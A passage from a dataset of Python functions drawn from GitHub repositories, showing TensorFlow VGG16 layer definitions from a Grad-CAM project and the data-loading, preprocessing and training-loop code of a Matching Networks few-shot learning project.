        out = tf.nn.bias_add(conv, biases)
        self.conv3_1 = tf.nn.relu(out, name=scope)
        self.layers[scope[:-1]] = self.conv3_1
        self.parameters += [kernel, biases]
    with tf.name_scope('conv3_2') as scope:
        kernel = tf.Variable(tf.truncated_normal([3, 3, 256, 256], dtype=tf.float32, stddev=0.1), name='weights')
        conv = tf.nn.conv2d(self.conv3_1, kernel, [1, 1, 1, 1], padding='SAME')
        biases = tf.Variable(tf.constant(0.0, shape=[256], dtype=tf.float32), trainable=True, name='biases')
        out = tf.nn.bias_add(conv, biases)
        self.conv3_2 = tf.nn.relu(out, name=scope)
        self.layers[scope[:-1]] = self.conv3_2
        self.parameters += [kernel, biases]
    with tf.name_scope('conv3_3') as scope:
        kernel = tf.Variable(tf.truncated_normal([3, 3, 256, 256], dtype=tf.float32, stddev=0.1), name='weights')
        conv = tf.nn.conv2d(self.conv3_2, kernel, [1, 1, 1, 1], padding='SAME')
        biases = tf.Variable(tf.constant(0.0, shape=[256], dtype=tf.float32), trainable=True, name='biases')
        out = tf.nn.bias_add(conv, biases)
        self.conv3_3 = tf.nn.relu(out, name=scope)
        self.layers[scope[:-1]] = self.conv3_3
        self.parameters += [kernel, biases]
    self.pool3 = tf.nn.max_pool(self.conv3_3, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME', name='pool3')
    self.layers['pool3'] = self.pool3
    with tf.name_scope('conv4_1') as scope:
        kernel = tf.Variable(tf.truncated_normal([3, 3, 256, 512], dtype=tf.float32, stddev=0.1), name='weights')
        conv = tf.nn.conv2d(self.pool3, kernel, [1, 1, 1, 1], padding='SAME')
        biases = tf.Variable(tf.constant(0.0, shape=[512], dtype=tf.float32), trainable=True, name='biases')
        out = tf.nn.bias_add(conv, biases)
        self.conv4_1 = tf.nn.relu(out, name=scope)
        self.layers[scope[:-1]] = self.conv4_1
        self.parameters += [kernel, biases]
    with tf.name_scope('conv4_2') as scope:
        kernel = tf.Variable(tf.truncated_normal([3, 3, 512, 512], dtype=tf.float32, stddev=0.1), name='weights')
        conv = tf.nn.conv2d(self.conv4_1, kernel, [1, 1, 1, 1], padding='SAME')
        biases = tf.Variable(tf.constant(0.0, shape=[512], dtype=tf.float32), trainable=True, name='biases')
        out = tf.nn.bias_add(conv, biases)
        self.conv4_2 = tf.nn.relu(out, name=scope)
        self.layers[scope[:-1]] = self.conv4_2
        self.parameters += [kernel, biases]
    with tf.name_scope('conv4_3') as scope:
        kernel = tf.Variable(tf.truncated_normal([3, 3, 512, 512], dtype=tf.float32, stddev=0.1), name='weights')
        conv = tf.nn.conv2d(self.conv4_2, kernel, [1, 1, 1, 1], padding='SAME')
        biases = tf.Variable(tf.constant(0.0, shape=[512], dtype=tf.float32), trainable=True, name='biases')
        out = tf.nn.bias_add(conv, biases)
        self.conv4_3 = tf.nn.relu(out, name=scope)
        self.layers[scope[:-1]] = self.conv4_3
        self.parameters += [kernel, biases]
    self.pool4 = tf.nn.max_pool(self.conv4_3, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME', name='pool4')
    self.layers['pool4'] = self.pool4
    with tf.name_scope('conv5_1') as scope:
        kernel = tf.Variable(tf.truncated_normal([3, 3, 512, 512], dtype=tf.float32, stddev=0.1), name='weights')
        conv = tf.nn.conv2d(self.pool4, kernel, [1, 1, 1, 1], padding='SAME')
        biases = tf.Variable(tf.constant(0.0, shape=[512], dtype=tf.float32), trainable=True, name='biases')
        out = tf.nn.bias_add(conv, biases)
        self.conv5_1 = tf.nn.relu(out, name=scope)
        self.layers[scope[:-1]] = self.conv5_1
        self.parameters += [kernel, biases]
    with tf.name_scope('conv5_2') as scope:
        kernel = tf.Variable(tf.truncated_normal([3, 3, 512, 512], dtype=tf.float32, stddev=0.1), name='weights')
        conv = tf.nn.conv2d(self.conv5_1, kernel, [1, 1, 1, 1], padding='SAME')
        biases = tf.Variable(tf.constant(0.0, shape=[512], dtype=tf.float32), trainable=True, name='biases')
        out = tf.nn.bias_add(conv, biases)
        self.conv5_2 = tf.nn.relu(out, name=scope)
        self.layers[scope[:-1]] = self.conv5_2
        self.parameters += [kernel, biases]
    with tf.name_scope('conv5_3') as scope:
        kernel = tf.Variable(tf.truncated_normal([3, 3, 512, 512], dtype=tf.float32, stddev=0.1), name='weights')
        conv = tf.nn.conv2d(self.conv5_2, kernel, [1, 1, 1, 1], padding='SAME')
        biases = tf.Variable(tf.constant(0.0, shape=[512], dtype=tf.float32), trainable=True, name='biases')
        out = tf.nn.bias_add(conv, biases)
        self.conv5_3 = tf.nn.relu(out, name=scope)
        self.layers[scope[:-1]] = self.conv5_3
        self.parameters += [kernel, biases]
    self.pool5 = tf.nn.max_pool(self.conv5_3, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME', name='pool4')
    self.layers['pool5'] = self.pool5"
Ankush96/grad-cam.tensorflow,fc_layers,"def fc_layers(self):
    with tf.name_scope('fc1') as scope:
        shape = int(np.prod(self.pool5.get_shape()[1:]))
        fc1w = tf.Variable(tf.truncated_normal([shape, 4096], dtype=tf.float32, stddev=0.1), name='weights')
        fc1b = tf.Variable(tf.constant(1.0, shape=[4096], dtype=tf.float32), trainable=True, name='biases')
        pool5_flat = tf.reshape(self.pool5, [-1, shape])
        fc1l = tf.nn.bias_add(tf.matmul(pool5_flat, fc1w), fc1b)
        self.fc1 = tf.nn.relu(fc1l)
        self.layers[scope[:-1]] = self.fc1
        self.parameters += [fc1w, fc1b]
    with tf.name_scope('fc2') as scope:
        fc2w = tf.Variable(tf.truncated_normal([4096, 4096], dtype=tf.float32, stddev=0.1), name='weights')
        fc2b = tf.Variable(tf.constant(1.0, shape=[4096], dtype=tf.float32), trainable=True, name='biases')
        fc2l = tf.nn.bias_add(tf.matmul(self.fc1, fc2w), fc2b)
        self.fc2 = tf.nn.relu(fc2l)
        self.layers[scope[:-1]] = self.fc2
        self.parameters += [fc2w, fc2b]
    with tf.name_scope('fc3') as scope:
        fc3w = tf.Variable(tf.truncated_normal([4096, 1000], dtype=tf.float32, stddev=0.1), name='weights')
        fc3b = tf.Variable(tf.constant(1.0, shape=[1000], dtype=tf.float32), trainable=True, name='biases')
        self.fc3l = tf.nn.bias_add(tf.matmul(self.fc2, fc3w), fc3b)
        self.layers[scope[:-1]] = self.fc3l
        self.parameters += [fc3w, fc3b]"
Ankush96/grad-cam.tensorflow,load_weights,"def load_weights(self, weight_file, sess):
    weights = np.load(weight_file)
    keys = sorted(weights.keys())
    for (i, k) in enumerate(keys):
        print(i, k, np.shape(weights[k]))
        sess.run(self.parameters[i].assign(weights[k]))"
AntreasAntoniou/MatchingNetworks,augment_image,"def augment_image(image, k, channels):
    if channels == 1:
        image = image[:, :, 0]
    image = transform.rotate(image, angle=k, resize=False, center=None, order=1, mode='constant', cval=0, clip=True, preserve_range=False)
    if channels == 1:
        image = np.expand_dims(image, axis=2)
    return image"
AntreasAntoniou/MatchingNetworks,__init__,"def __init__(self, batch_size, reverse_channels, num_of_gpus, image_height, image_width, image_channels, train_val_test_split, num_classes_per_set, num_samples_per_class, data_path, dataset_name, indexes_of_folders_indicating_class, seed=100, reset_stored_filepaths=False, labels_as_int=False):
    """"""
        :param batch_size: The batch size to use for the data loader
        :param last_training_class_index: The final index for the training set, used to restrict the training set
        if needed. E.g. if training set is 1200 classes and last_training_class_index=900 then only the first 900
        classes will be used
        :param reverse_channels: A boolean indicating whether we need to reverse the colour channels e.g. RGB to BGR
        :param num_of_gpus: Number of gpus to use for training
        :param gen_batches: How many batches to use from the validation set for the end of epoch generations
        """"""
    self.data_path = data_path
    self.dataset_name = dataset_name
    self.indexes_of_folders_indicating_class = indexes_of_folders_indicating_class
    self.labels_as_int = labels_as_int
    self.train_val_test_split = train_val_test_split
    self.current_dataset_name = 'train'
    self.reset_stored_filepaths = reset_stored_filepaths
    (self.x_train, self.x_val, self.x_test) = self.load_dataset()
    self.num_of_gpus = num_of_gpus
    self.batch_size = batch_size
    self.reverse_channels = reverse_channels
    (self.image_height, self.image_width, self.image_channel) = (image_height, image_width, image_channels)
    self.train_index = 0
    self.val_index = 0
    self.test_index = 0
    self.init_seed = {'train': seed, 'val': seed, 'test': seed}
    self.seed = {'train': seed, 'val': seed, 'test': seed}
    self.augment_images = False
    self.num_samples_per_class = num_samples_per_class
    self.num_classes_per_set = num_classes_per_set
    self.indexes = {'train': 0, 'val': 0, 'test': 0}
    self.datasets = {'train': self.x_train, 'val': self.x_val, 'test': self.x_test}
    self.dataset_size_dict = {'train': {key: len(self.x_train[key]) for key in list(self.x_train.keys())}, 'val': {key: len(self.x_val[key]) for key in list(self.x_val.keys())}, 'test': {key: len(self.x_test[key]) for key in list(self.x_test.keys())}}
    self.label_set = self.get_label_set()
    self.data_length = {name: np.sum([len(self.datasets[name][key]) for key in self.datasets[name]]) for name in self.datasets.keys()}
    print('data', self.data_length)"
AntreasAntoniou/MatchingNetworks,load_dataset,"def load_dataset(self):
    (data_image_paths, index_to_label_name_dict_file, label_to_index) = self.load_datapaths()
    total_label_types = len(data_image_paths)
    print(total_label_types)
    (x_train_id, x_val_id, x_test_id) = (int(self.train_val_test_split[0] * total_label_types), int(np.sum(self.train_val_test_split[:2]) * total_label_types), int(total_label_types))
    print(x_train_id, x_val_id, x_test_id)
    x_train_classes = (class_key for class_key in list(data_image_paths.keys())[:x_train_id])
    x_val_classes = (class_key for class_key in list(data_image_paths.keys())[x_train_id:x_val_id])
    x_test_classes = (class_key for class_key in list(data_image_paths.keys())[x_val_id:x_test_id])
    (x_train, x_val, x_test) = ({class_key: data_image_paths[class_key] for class_key in x_train_classes}, {class_key: data_image_paths[class_key] for class_key in x_val_classes}, {class_key: data_image_paths[class_key] for class_key in x_test_classes})
    return (x_train, x_val, x_test)"
AntreasAntoniou/MatchingNetworks,load_datapaths,"def load_datapaths(self):
    data_path_file = 'datasets/{}.pkl'.format(self.dataset_name)
    self.index_to_label_name_dict_file = 'datasets/map_to_label_name_{}.pkl'.format(self.dataset_name)
    self.label_name_to_map_dict_file = 'datasets/label_name_to_map_{}.pkl'.format(self.dataset_name)
    if self.reset_stored_filepaths == True:
        if os.path.exists(data_path_file):
            os.remove(data_path_file)
            self.reset_stored_filepaths = False
    try:
        data_image_paths = self.load_dict(data_path_file)
        label_to_index = self.load_dict(name=self.label_name_to_map_dict_file)
        index_to_label_name_dict_file = self.load_dict(name=self.index_to_label_name_dict_file)
        return (data_image_paths, index_to_label_name_dict_file, label_to_index)
    except:
        print(""Mapped data paths can't be found, remapping paths.."")
        (data_image_paths, code_to_label_name, label_name_to_code) = self.get_data_paths()
        self.save_dict(data_image_paths, name=data_path_file)
        self.save_dict(code_to_label_name, name=self.index_to_label_name_dict_file)
        self.save_dict(label_name_to_code, name=self.label_name_to_map_dict_file)
        return self.load_datapaths()"
AntreasAntoniou/MatchingNetworks,save_dict,"def save_dict(self, obj, name):
    with open(name, 'wb') as f:
        pickle.dump(obj, f, pickle.HIGHEST_PROTOCOL)"
AntreasAntoniou/MatchingNetworks,load_dict,"def load_dict(self, name):
    with open(name, 'rb') as f:
        return pickle.load(f)"
AntreasAntoniou/MatchingNetworks,load_test_image,"def load_test_image(self, filepath):
    try:
        image = cv2.imread(filepath)
        image = cv2.resize(image, dsize=(28, 28))
    except RuntimeWarning:
        os.system('convert {} -strip {}'.format(filepath, filepath))
        print('converting')
        image = cv2.imread(filepath)
        image = cv2.resize(image, dsize=(28, 28))
    except:
        print('Broken image')
        os.remove(filepath)
    if image is not None:
        return filepath
    else:
        os.remove(filepath)
        return None"
AntreasAntoniou/MatchingNetworks,get_data_paths,"def get_data_paths(self):
    print('Get images from', self.data_path)
    data_image_path_list_raw = []
    labels = set()
    for (subdir, dir, files) in os.walk(self.data_path):
        for file in files:
            if '.jpeg' in file.lower() or '.png' in file.lower() or '.jpg' in file.lower():
                filepath = os.path.join(subdir, file)
                label = self.get_label_from_path(filepath)
                data_image_path_list_raw.append(filepath)
                labels.add(label)
    labels = sorted(labels)
    idx_to_label_name = {idx: label for (idx, label) in enumerate(labels)}
    label_name_to_idx = {label: idx for (idx, label) in enumerate(labels)}
    data_image_path_dict = {idx: [] for idx in list(idx_to_label_name.keys())}
    with tqdm.tqdm(total=len(data_image_path_list_raw)) as pbar_error:
        with concurrent.futures.ProcessPoolExecutor(max_workers=4) as executor:
            for image_file in executor.map(self.load_test_image, data_image_path_list_raw):
                pbar_error.update(1)
                if image_file is not None:
                    label = self.get_label_from_path(image_file)
                    data_image_path_dict[label_name_to_idx[label]].append(image_file)
    return (data_image_path_dict, idx_to_label_name, label_name_to_idx)"
AntreasAntoniou/MatchingNetworks,get_label_set,"def get_label_set(self):
    index_to_label_name_dict_file = self.load_dict(name=self.index_to_label_name_dict_file)
    return set(list(index_to_label_name_dict_file.keys()))"
AntreasAntoniou/MatchingNetworks,get_index_from_label,"def get_index_from_label(self, label):
    label_to_index = self.load_dict(name=self.label_name_to_map_dict_file)
    return label_to_index[label]"
AntreasAntoniou/MatchingNetworks,get_label_from_index,"def get_label_from_index(self, index):
    index_to_label_name = self.load_dict(name=self.index_to_label_name_dict_file)
    return index_to_label_name[index]"
AntreasAntoniou/MatchingNetworks,get_label_from_path,"def get_label_from_path(self, filepath):
    label_bits = filepath.split('/')
    label = '_'.join([label_bits[idx] for idx in self.indexes_of_folders_indicating_class])
    if self.labels_as_int:
        label = int(label)
    return label"
AntreasAntoniou/MatchingNetworks,load_image,"def load_image(self, image_path, channels):
    image = cv2.imread(image_path)[:, :, :channels]
    image = cv2.resize(image, dsize=(self.image_height, self.image_width))
    if channels == 1:
        image = np.expand_dims(image, axis=2)
    return image"
AntreasAntoniou/MatchingNetworks,load_batch,"def load_batch(self, batch_image_paths):
    image_batch = []
    image_paths = []
    for image_path in batch_image_paths:
        image_paths.append(image_path)
    for image_path in image_paths:
        image = self.load_image(image_path=image_path, channels=self.image_channel)
        image_batch.append(image)
    image_batch = np.array(image_batch, dtype=np.float32)
    image_batch = self.preprocess_data(image_batch)
    return image_batch"
AntreasAntoniou/MatchingNetworks,preprocess_data,"def preprocess_data(self, x):
    """"""
        Preprocesses data such that their values lie in the -1.0 to 1.0 range so that the tanh activation gen output
        can work properly
        :param x: A data batch to preprocess
        :return: A preprocessed data batch
        """"""
    x = x / 255.0
    x = 2 * x - 1
    x_shape = x.shape
    x = np.reshape(x, (-1, x_shape[-3], x_shape[-2], x_shape[-1]))
    if self.reverse_channels is True:
        reverse_photos = np.ones(shape=x.shape)
        for channel in range(x.shape[-1]):
            reverse_photos[:, :, :, x.shape[-1] - 1 - channel] = x[:, :, :, channel]
        x = reverse_photos
    x = x.reshape(x_shape)
    return x"
AntreasAntoniou/MatchingNetworks,reconstruct_original,"def reconstruct_original(self, x):
    """"""
        Applies the reverse operations that preprocess_data() applies such that the data returns to their original form
        :param x: A batch of data to reconstruct
        :return: A reconstructed batch of data
        """"""
    x = (x + 1) / 2
    x = x * 255.0
    return x"
AntreasAntoniou/MatchingNetworks,shuffle,"def shuffle(self, x):
    """"""
        Shuffles the data batch along it's first axis
        :param x: A data batch
        :return: A shuffled data batch
        """"""
    indices = np.arange(len(x))
    np.random.shuffle(indices)
    x = x[indices]
    return x"
AntreasAntoniou/MatchingNetworks,get_set,"def get_set(self, dataset_name, seed, augment_images=False):
    """"""
        Generates a data batch to be used for training or evaluation
        :param set_name: The name of the set to use, e.g. ""train"", ""val"" etc
        :return: A data batch
        """"""
    rng = np.random.RandomState(seed)
    selected_classes = rng.choice(list(self.dataset_size_dict[dataset_name].keys()), size=self.num_classes_per_set, replace=False)
    target_class = rng.choice(selected_classes, size=1, replace=False)[0]
    k_list = rng.randint(0, 3, size=self.num_classes_per_set)
    k_dict = {selected_class: k_item for (selected_class, k_item) in zip(selected_classes, k_list)}
    episode_labels = [i for i in range(self.num_classes_per_set)]
    class_to_episode_label = {selected_class: episode_label for (selected_class, episode_label) in zip(selected_classes, episode_labels)}
    support_set_images = []
    support_set_labels = []
    for class_entry in selected_classes:
        choose_samples_list = rng.choice(self.dataset_size_dict[dataset_name][class_entry], size=self.num_samples_per_class, replace=True)
        class_image_samples = []
        class_labels = []
        for sample in choose_samples_list:
            choose_samples = self.datasets[dataset_name][class_entry][sample]
            x_class_data = self.load_batch([choose_samples])[0]
            if augment_images is True:
                k = k_dict[class_entry]
                x_class_data = augment_image(image=x_class_data, k=k * 90, channels=self.image_channel)
            class_image_samples.append(x_class_data)
            class_labels.append(int(class_to_episode_label[class_entry]))
        support_set_images.append(class_image_samples)
        support_set_labels.append(class_labels)
    support_set_images = np.array(support_set_images, dtype=np.float32)
    support_set_labels = np.array(support_set_labels, dtype=np.int32)
    target_sample = rng.choice(self.dataset_size_dict[dataset_name][target_class], size=1, replace=True)[0]
    choose_samples = self.datasets[dataset_name][target_class][target_sample]
    target_set_image = self.load_batch([choose_samples])[0]
    if augment_images is True:
        k = k_dict[target_class]
        target_set_image = augment_image(image=target_set_image, k=k * 90, channels=self.image_channel)
    target_set_label = int(class_to_episode_label[target_class])
    return (support_set_images, target_set_image, support_set_labels, target_set_label)"
AntreasAntoniou/MatchingNetworks,__len__,"def __len__(self):
    total_samples = self.data_length[self.current_dataset_name]
    return total_samples"
AntreasAntoniou/MatchingNetworks,length,"def length(self, dataset_name):
    self.switch_set(dataset_name=dataset_name)
    return len(self)"
AntreasAntoniou/MatchingNetworks,set_augmentation,"def set_augmentation(self, augment_images):
    self.augment_images = augment_images"
AntreasAntoniou/MatchingNetworks,switch_set,"def switch_set(self, dataset_name, seed=100):
    self.current_dataset_name = dataset_name
    if dataset_name == 'train':
        self.update_seed(dataset_name=dataset_name, seed=seed)"
AntreasAntoniou/MatchingNetworks,update_seed,"def update_seed(self, dataset_name, seed=100):
    self.init_seed[dataset_name] = seed"
AntreasAntoniou/MatchingNetworks,__getitem__,"def __getitem__(self, idx):
    (support_set_images, target_set_image, support_set_labels, target_set_label) = self.get_set(self.current_dataset_name, seed=self.init_seed[self.current_dataset_name] + idx, augment_images=self.augment_images)
    data_point = {'support_set_images': support_set_images, 'target_set_image': target_set_image, 'support_set_labels': support_set_labels, 'target_set_label': target_set_label}
    self.seed[self.current_dataset_name] = self.seed[self.current_dataset_name] + 1
    return data_point"
AntreasAntoniou/MatchingNetworks,reset_seed,"def reset_seed(self):
    self.seed = self.init_seed"
AntreasAntoniou/MatchingNetworks,__init__,"def __init__(self, name, num_of_gpus, batch_size, image_height, image_width, image_channels, num_classes_per_set, data_path, num_samples_per_class, train_val_test_split, samples_per_iter=1, num_workers=4, reverse_channels=False, seed=100, labels_as_int=False):
    self.zip_dir = 'datasets/{}.zip'.format(name)
    self.data_folder_dir = 'datasets/{}'.format(name)
    self.datasets_dir = 'datasets/'
    self.num_of_gpus = num_of_gpus
    self.batch_size = batch_size
    self.samples_per_iter = samples_per_iter
    self.num_workers = num_workers
    self.total_train_iters_produced = 0
    self.dataset = self.get_dataset(batch_size, reverse_channels, num_of_gpus, image_height, image_width, image_channels, train_val_test_split, num_classes_per_set, num_samples_per_class, seed=seed, reset_stored_filepaths=False, data_path=data_path, labels_as_int=labels_as_int)
    self.batches_per_iter = samples_per_iter
    self.full_data_length = self.dataset.data_length"
AntreasAntoniou/MatchingNetworks,get_dataloader,"def get_dataloader(self, shuffle=False):
    return DataLoader(self.dataset, batch_size=self.num_of_gpus * self.batch_size * self.samples_per_iter, shuffle=shuffle, num_workers=self.num_workers, drop_last=True)"
AntreasAntoniou/MatchingNetworks,get_dataset,"def get_dataset(self, batch_size, reverse_channels, num_of_gpus, image_height, image_width, image_channels, train_val_test_split, num_classes_per_set, num_samples_per_class, seed, reset_stored_filepaths, data_path, labels_as_int):
    return NotImplementedError"
AntreasAntoniou/MatchingNetworks,get_train_batches,"def get_train_batches(self, total_batches=-1, augment_images=False):
    if total_batches == -1:
        self.dataset.data_length = self.full_data_length
    else:
        self.dataset.data_length['train'] = total_batches * self.dataset.batch_size
    self.dataset.switch_set(dataset_name='train', seed=self.dataset.init_seed['train'] + self.total_train_iters_produced)
    self.dataset.set_augmentation(augment_images=augment_images)
    self.total_train_iters_produced += self.dataset.data_length['train']
    for (sample_id, sample_batched) in enumerate(self.get_dataloader(shuffle=True)):
        preprocess_sample = self.sample_iter_data(sample=sample_batched, num_gpus=self.dataset.num_of_gpus, samples_per_iter=self.batches_per_iter, batch_size=self.dataset.batch_size)
        yield preprocess_sample"
AntreasAntoniou/MatchingNetworks,get_val_batches,"def get_val_batches(self, total_batches=-1, augment_images=False):
    if total_batches == -1:
        self.dataset.data_length = self.full_data_length
    else:
        self.dataset.data_length['val'] = total_batches * self.dataset.batch_size
    self.dataset.switch_set(dataset_name='val')
    self.dataset.set_augmentation(augment_images=augment_images)
    for (sample_id, sample_batched) in enumerate(self.get_dataloader(shuffle=False)):
        preprocess_sample = self.sample_iter_data(sample=sample_batched, num_gpus=self.dataset.num_of_gpus, samples_per_iter=self.batches_per_iter, batch_size=self.dataset.batch_size)
        yield preprocess_sample"
AntreasAntoniou/MatchingNetworks,get_test_batches,"def get_test_batches(self, total_batches=-1, augment_images=False):
    if total_batches == -1:
        self.dataset.data_length = self.full_data_length
    else:
        self.dataset.data_length['test'] = total_batches * self.dataset.batch_size
    self.dataset.switch_set(dataset_name='test')
    self.dataset.set_augmentation(augment_images=augment_images)
    for (sample_id, sample_batched) in enumerate(self.get_dataloader(shuffle=False)):
        preprocess_sample = self.sample_iter_data(sample=sample_batched, num_gpus=self.dataset.num_of_gpus, samples_per_iter=self.batches_per_iter, batch_size=self.dataset.batch_size)
        yield preprocess_sample"
AntreasAntoniou/MatchingNetworks,sample_iter_data,"def sample_iter_data(self, sample, num_gpus, batch_size, samples_per_iter):
    output_sample = []
    for key in sample.keys():
        sample[key] = np.array(sample[key].numpy(), dtype=np.float32)
        new_shape = []
        curr_id = 1
        for i in range(len(sample[key].shape) + 2):
            if i == 0:
                new_shape.append(samples_per_iter)
            elif i == 1:
                new_shape.append(num_gpus)
            elif i == 2:
                new_shape.append(batch_size)
            else:
                new_shape.append(sample[key].shape[curr_id])
                curr_id += 1
        output_sample.append(np.reshape(sample[key], newshape=new_shape))
    return output_sample"
AntreasAntoniou/MatchingNetworks,__init__,"def __init__(self, name, num_of_gpus, batch_size, image_height, image_width, image_channels, train_val_test_split, data_path, indexes_of_folders_indicating_class, reset_stored_filepaths, num_samples_per_class, num_classes_per_set, labels_as_int, reverse_channels):
    super(FolderMatchingNetworkDatasetParallel, self).__init__(batch_size=batch_size, reverse_channels=reverse_channels, num_of_gpus=num_of_gpus, image_height=image_height, image_width=image_width, image_channels=image_channels, train_val_test_split=train_val_test_split, reset_stored_filepaths=reset_stored_filepaths, num_classes_per_set=num_classes_per_set, num_samples_per_class=num_samples_per_class, labels_as_int=labels_as_int, data_path=os.path.abspath(data_path), dataset_name=name, indexes_of_folders_indicating_class=indexes_of_folders_indicating_class)"
AntreasAntoniou/MatchingNetworks,__init__,"def __init__(self, name, batch_size, image_height, image_width, image_channels, data_path, train_val_test_split, num_of_gpus=1, samples_per_iter=1, num_workers=4, indexes_of_folders_indicating_class=[-2], reset_stored_filepaths=False, num_samples_per_class=1, num_classes_per_set=20, reverse_channels=False, seed=100, label_as_int=False):
    self.name = name
    self.indexes_of_folders_indicating_class = indexes_of_folders_indicating_class
    self.reset_stored_filepaths = reset_stored_filepaths
    super(FolderDatasetLoader, self).__init__(name, num_of_gpus, batch_size, image_height, image_width, image_channels, num_classes_per_set, data_path, num_samples_per_class, train_val_test_split, samples_per_iter, num_workers, reverse_channels, seed, labels_as_int=label_as_int)"
AntreasAntoniou/MatchingNetworks,get_dataset,"def get_dataset(self, batch_size, reverse_channels, num_of_gpus, image_height, image_width, image_channels, train_val_test_split, num_classes_per_set, num_samples_per_class, seed, reset_stored_filepaths, data_path, labels_as_int):
    return FolderMatchingNetworkDatasetParallel(name=self.name, num_of_gpus=num_of_gpus, batch_size=batch_size, image_height=image_height, image_width=image_width, image_channels=image_channels, train_val_test_split=train_val_test_split, data_path=data_path, indexes_of_folders_indicating_class=self.indexes_of_folders_indicating_class, reset_stored_filepaths=self.reset_stored_filepaths, num_samples_per_class=num_samples_per_class, num_classes_per_set=num_classes_per_set, labels_as_int=labels_as_int, reverse_channels=reverse_channels)"
AntreasAntoniou/MatchingNetworks,__init__,"def __init__(self, data):
    """"""
        Initializes an ExperimentBuilder object. The ExperimentBuilder object takes care of setting up our experiment
        and provides helper functions such as run_training_epoch and run_validation_epoch to simplify out training
        and evaluation procedures.
        :param data: A data provider class
        """"""
    self.data = data"
AntreasAntoniou/MatchingNetworks,build_experiment,"def build_experiment(self, batch_size, classes_per_set, samples_per_class, fce, args, full_context_unroll_k=5, num_gpus=1, data_augmentation=True):
    """"""

        :param batch_size: The experiment batch size
        :param classes_per_set: An integer indicating the number of classes per support set
        :param samples_per_class: An integer indicating the number of samples per class
        :param channels: The image channels
        :param fce: Whether to use full context embeddings or not
        :return: a matching_network object, along with the losses, the training ops and the init op
        """"""
    (height, width, channels) = (self.data.dataset.image_height, self.data.dataset.image_width, self.data.dataset.image_channel)
    self.support_set_images = tf.placeholder(tf.float32, [num_gpus, batch_size, classes_per_set, samples_per_class, height, width, channels], 'support_set_images')
    self.support_set_labels = tf.placeholder(tf.int32, [num_gpus, batch_size, classes_per_set, samples_per_class], 'support_set_labels')
    self.target_image = tf.placeholder(tf.float32, [num_gpus, batch_size, height, width, channels], 'target_image')
    self.target_label = tf.placeholder(tf.int32, [num_gpus, batch_size], 'target_label')
    self.training_phase = tf.placeholder(tf.bool, name='training-flag')
    self.dropout_rate = tf.placeholder(tf.float32, name='dropout-prob')
    self.current_learning_rate = 0.001
    self.learning_rate = tf.placeholder(tf.float32, name='learning-rate-set')
    self.args = args
    self.one_shot_omniglot = MatchingNetwork(batch_size=batch_size, support_set_images=self.support_set_images, support_set_labels=self.support_set_labels, target_image=self.target_image, target_label=self.target_label, dropout_rate=self.dropout_rate, num_channels=channels, is_training=self.training_phase, fce=fce, num_classes_per_set=classes_per_set, num_samples_per_class=samples_per_class, learning_rate=self.learning_rate, full_context_unroll_k=full_context_unroll_k)
    self.data_augmentation = data_augmentation
    (summary, self.losses, self.c_error_opt_op) = self.one_shot_omniglot.init_train()
    init = tf.global_variables_initializer()
    self.total_train_iter = 0
    return (self.one_shot_omniglot, self.losses, self.c_error_opt_op, init)"
AntreasAntoniou/MatchingNetworks,run_training_epoch,"def run_training_epoch(self, total_train_batches, sess):
    """"""
        Runs one training epoch
        :param total_train_batches: Number of batches to train on
        :param sess: Session object
        :return: mean_training_categorical_crossentropy_loss and mean_training_accuracy
        """"""
    total_train_c_loss = []
    total_train_accuracy = []
    with tqdm.tqdm(total=total_train_batches) as pbar:
        for (sample_id, train_sample) in enumerate(self.data.get_train_batches(total_batches=total_train_batches, augment_images=self.data_augmentation)):
            (support_set_images, target_set_image, support_set_labels, target_set_label) = train_sample
            (_, c_loss_value, acc) = sess.run([self.c_error_opt_op, self.losses[self.one_shot_omniglot.classify], self.losses[self.one_shot_omniglot.dn]], feed_dict={self.dropout_rate: self.args.dropout_rate_value, self.support_set_images: support_set_images[0], self.support_set_labels: support_set_labels[0], self.target_image: target_set_image[0], self.target_label: target_set_label[0], self.training_phase: True, self.learning_rate: self.current_learning_rate})
            iter_out = 'train_loss: {}, train_accuracy: {}'.format(c_loss_value, acc)
            pbar.set_description(iter_out)
            pbar.update(1)
            total_train_c_loss.append(c_loss_value)
            total_train_accuracy.append(acc)
            self.total_train_iter += 1
            if self.total_train_iter % 2000 == 0:
                self.current_learning_rate /= 2
                print('change learning rate', self.current_learning_rate)
    total_train_c_loss_mean = np.mean(total_train_c_loss)
    total_train_c_loss_std = np.std(total_train_c_loss)
    total_train_accuracy_mean = np.mean(total_train_accuracy)
    total_train_accuracy_std = np.std(total_train_accuracy)
    return (total_train_c_loss_mean, total_train_c_loss_std, total_train_accuracy_mean, total_train_accuracy_std)"
AntreasAntoniou/MatchingNetworks,run_validation_epoch,"def run_validation_epoch(self, total_val_batches, sess):
    """"""
        Runs one validation epoch
        :param total_val_batches: Number of batches to train on
        :param sess: Session object
        :return: mean_validation_categorical_crossentropy_loss and mean_validation_accuracy
        """"""
    total_val_c_loss = []
    total_val_accuracy = []
    with tqdm.tqdm(total=total_val_batches) as pbar:
        for (sample_id, val_sample) in enumerate(self.data.get_val_batches(total_batches=total_val_batches, augment_images=False)):
            (support_set_images, target_set_image, support_set_labels, target_set_label) = val_sample
            (c_loss_value, acc) = sess.run([self.losses[self.one_shot_omniglot.classify], self.losses[self.one_shot_omniglot.dn]], feed_dict={self.dropout_rate: self.args.dropout_rate_value, self.support_set_images: support_set_images[0], self.support_set_labels: support_set_labels[0], self.target_image: target_set_image[0], self.target_label: target_set_label[0], self.training_phase: False, self.learning_rate: self.current_learning_rate})
            iter_out = 'val_loss: {}, val_accuracy: {}'.format(c_loss_value, acc)
            pbar.set_description(iter_out)
            pbar.update(1)
            total_val_c_loss.append(c_loss_value)
            total_val_accuracy.append(acc)
    total_val_c_loss_mean = np.mean(total_val_c_loss)
    total_val_c_loss_std = np.std(total_val_c_loss)
    total_val_accuracy_mean = np.mean(total_val_accuracy)
    total_val_accuracy_std = np.std(total_val_accuracy)
    return (total_val_c_loss_mean, total_val_c_loss_std, total_val_accuracy_mean, total_val_accuracy_std)"
AntreasAntoniou/MatchingNetworks,run_testing_epoch,"def run_testing_epoch(self, total_test_batches, sess):
    """"""
        Runs one testing epoch
        :param total_test_batches: Number of batches to train on
        :param sess: Session object
        :return: mean_testing_categorical_crossentropy_loss and mean_testing_accuracy
        """"""
    total_test_c_loss = []
    total_test_accuracy = []
    with tqdm.tqdm(total=total_test_batches) as pbar:
